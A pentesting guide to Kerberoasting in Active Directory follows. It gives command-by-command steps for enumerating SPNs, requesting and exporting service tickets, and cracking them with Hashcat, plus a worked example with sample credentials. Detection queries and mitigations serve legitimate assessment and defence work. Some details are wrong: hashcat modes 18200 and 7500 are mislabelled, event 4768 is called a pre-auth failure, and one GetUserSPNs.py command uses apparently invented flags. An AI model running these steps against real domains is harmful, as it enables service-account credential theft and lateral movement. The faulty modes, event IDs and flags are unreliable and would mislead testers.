# Kerberoasting Deep Dive

## Overview

Kerberoasting is an Active Directory attack that allows an attacker with a standard domain account to request service tickets (TGS) for SPN-registered service accounts and crack them offline to recover service account passwords.

**Core value for pentesters:** No domain admin or privileged access required. Low-and-slow, offline cracking means the attack often goes undetected until after credential compromise.

---

## Background

### Kerberos Basics
- Kerberos is the default authentication protocol in Active Directory.
- The Key Distribution Center (KDC) issues two main tickets:
  - **TGT (Ticket Granting Ticket):** proof of identity, obtained at logon
  - **TGS (Service Ticket):** proof of authorization for a specific service

### Service Principal Names (SPNs)
- SPNs uniquely identify a service instance.
- Examples:
  - `HTTP/web01.corp.local`
  - `MSSQLSvc/sql01.corp.local:1433`
  - `cifs/fileserver01.corp.local`
- SPNs are tied to service accounts in AD (can be domain user, computer, or managed service account).

### The Weak Link: RC4 Encryption
- By default, many service accounts still support RC4-HMAC encryption for Kerberos.
- RC4 is based on weak 128-bit keys and maps directly to NTLM hashes.
- If an attacker can get a TGS encrypted with RC4, they can crack it offline just like an NTLM hash.

---

## Attack Flow

```
1. Discover SPNs in AD (ldapsearch, Impacket, PowerView)
2. Request TGS for each SPN using the attacker's standard domain credentials
3. Export the TGS blob(s)
4. Crack offline with Hashcat or John the Ripper
5. Recover cleartext / NTLM password for the service account
6. Use those credentials for lateral movement or privilege escalation
```

### Step 1: Enumerate SPNs
```powershell
# PowerView
Get-DomainUser -SPN | Select samaccountname, serviceprincipalname

# Impacket
GetUserSPNs.py -dc-ip 10.0.0.1 CORP/user:password
```

### Step 2: Request TGS Tickets
```powershell
# PowerView
Request-SPNTicket -SPN "MSSQLSvc/sql01.corp.local:1433"

# Impacket
GetUserSPNs.py -dc-ip 10.0.0.1 CORP/user:password -request
```

### Step 3: Dump / Export Tickets
```powershell
# PowerView
Get-Kerberoast -SPN "MSSQLSvc/sql01.corp.local:1433" | Export-Clixml tickets.xml

# From memory (Mimikatz / Rubeus)
kerberos::list /export
```

### Step 4: Crack Tickets
```bash
# Hashcat mode 13100 (Kerberos TGS)
hashcat -m 13100 tickets.txt wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt tickets.txt
```

---

## Tools of the Trade

| Tool | Purpose | Link | Notes |
|---|---|---|---|
| **Impacket** `GetUserSPNs.py` | Enumerate SPNs and request TGS | https://github.com/fortra/impacket | Pure Python, no AD DS tools required |
| **PowerView** `Get-DomainUser -SPN`, `Request-SPNTicket` | SPN enumeration + ticket request | PowerSploit | Requires PowerShell execution on domain-joined host |
| **Rubeus** | Kerberoasting, ticket management, overpass-the-hash | https://github.com/GhostPack/Rubeus | C# tool, runs in memory |
| **Mimikatz** | Kerberos manipulation, ticket export | https://github.com/gentilkiwi/mimikatz | Classic, noisy, AV-prone |
| **Hashcat** `-m 13100` | Offline TGS cracking | https://hashcat.net | Fastest option; GPU acceleration |
| **John the Ripper** `--format=krb5tgs` | Offline TGS cracking | https://www.openwall.com/john/ | CPU-friendly, good for rules |
| **Kerberoast.py** | Lightweight alternative to Impacket | https://github.com/nidem/kerberoast | Older but still used |
| **BloodHound** (cypher) | Find SPNs and high-value accounts | https://github.com/SpecterOps/bloodhound | Great for attack path mapping |

---

## Attack Prerequisites

- Standard domain user account (no special privileges)
- Network access to the KDC (usually UDP/TCP 88)
- The target service account must have an RC4-enabled key
- Service account password must be crackable within time constraints

---

## Detection

### Event Logs
- **Windows Event ID 4769** — "A Kerberos service ticket was requested"
  - Look for large volumes of TGS requests from a single user to many SPNs.
  - Look for RC4 encryption type (`0x17`).
- **Event ID 4624** (Logon Type 3) from the service account after password recovery.
- **Kerberos pre-auth failures** (4768) may indicate enumeration before roasting.

### Network
- Multiple KDC requests (`AS-REQ` / `TGS-REQ`) in a short timeframe.
- Source IPs that are not typical application servers requesting service tickets.

### Mitre ATT&CK
- **T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting**

### Defensive Queries (Splunk / Sentinel Example)
```spl
index=windows sourcetype="WinEventLog:Security" EventCode=4769
| stats count by TargetUserName, ServiceName, TicketEncryptionType
| where count > 5 OR TicketEncryptionType == "0x17"
```

---

## Mitigations

### Preemptive
- Use **AES-only** encryption for service accounts (Kerberos AES128/256).
- Set strong, unique passwords for service accounts (25+ chars).
- Avoid using domain user accounts as service accounts; use **Group Managed Service Accounts (gMSA)** when possible.
- Apply **SPN constraints** and audit SPN registrations.

### Detective / Response
- Alert on Event ID 4769 with RC4 and high request rate.
- Monitor for unusual logon patterns from service accounts after off-hours.
- Enable **Kerberos Armoring (FAST)** if environment supports it.
- Deploy EDR with Kerberos-specific detections.

---

## Practical Example: From Recon to Crack

```bash
# 1. Enumerate SPNs
GetUserSPNs.py -dc-ip 10.0.10.5 CORP/bob:Password123 -request -outputfile tgs.txt

# 2. Convert to hashcat if needed
python3 GetUserSPNs.py CORP/bob:Password123 -request -save -format hashcat
# Or use impacket-tools converter

# 3. Crack with hashcat
hashcat -m 13100 -a 0 tgs_hashes.txt /usr/share/wordlists/rockyou.txt

# 4. Recovered password example
# $krb5tgs$23$*user$realm$spn*$...hash...:SomePassw0rd!
```

---

## Bug Bounty / Pentesting Relevance

- Active Directory assessments almost always include Kerberoasting.
- Even without admin access, this often yields service account credentials.
- Service accounts commonly have excessive privileges (local admin, sql access, app backend).
- High-value targets: `MSSQLSvc`, `HTTP`, `cifs`, ` TERMSVC`, custom app SPNs.
- Combine with **AS-REP roasting** and **DCSync** for full AD compromise chains.

---

## Common Pitfalls

- Forgetting to clear cached tickets after testing (`klist purge`).
- Using the wrong hashcat mode (`13100` for TGS, `18200` for Net-NTLMv2, `7500` for Kerberos AES).
- Tunneling Kerberos traffic through SOCKS/proxychains when targeting from outside the domain.
- Generating excessive TGS requests and triggering account lockout policies.
- Assuming locked accounts cannot be roasted — the attack targets service accounts, not the attacker's account.

---

## References

- Impacket: https://github.com/fortra/impacket
- Rubeus: https://github.com/GhostPack/Rubeus
- Kerberoast: https://github.com/nidem/kerberoast
- Hashcat Kerberos modes: https://hashcat.net/wiki/doku.php?id=example_hashes
- MITRE ATT&CK T1558.003: https://attack.mitre.org/techniques/T1558/003/
- Harmj0y Kerberoasting overview: https://blog.harmj0y.net/active-directory/kerberoast/
- SpecterOps AMSI bypass and in-memory tradecraft (related tooling guidance)
